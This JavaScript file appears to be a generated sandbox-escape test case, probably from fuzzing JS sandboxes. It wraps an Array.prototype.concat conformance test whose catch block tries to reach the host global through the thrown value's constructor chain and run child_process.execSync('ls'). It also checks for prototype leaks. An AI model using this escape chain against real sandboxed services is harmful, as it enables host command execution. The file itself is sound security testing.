try {
    var calls = [];
    var descConstructor = {
        get: function () {
            throw () => {
                return () => {
                };
            };
            calls.push('constructor');
            return Array;
        },
        configurable: true
    };
    var descSpreadable = {
        get: function () {
            calls.push('isConcatSpreadable');
        },
        configurable: true
    };
    var arr1 = [];
    Object.defineProperty(arr1, 'constructor', descConstructor);
    Object.defineProperty(arr1, Symbol.isConcatSpreadable, descSpreadable);
    assert.compareArray(arr1.concat(1), [1]);
    assert.compareArray(calls, [
        'constructor',
        'isConcatSpreadable'
    ]);
    calls = [];
    var arr2 = [];
    var arg = {};
    Object.defineProperty(arr2, 'constructor', descConstructor);
    Object.defineProperty(arg, Symbol.isConcatSpreadable, descSpreadable);
    assert.compareArray(arr2.concat(arg), [arg]);
    assert.compareArray(calls, [
        'constructor',
        'isConcatSpreadable'
    ]);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}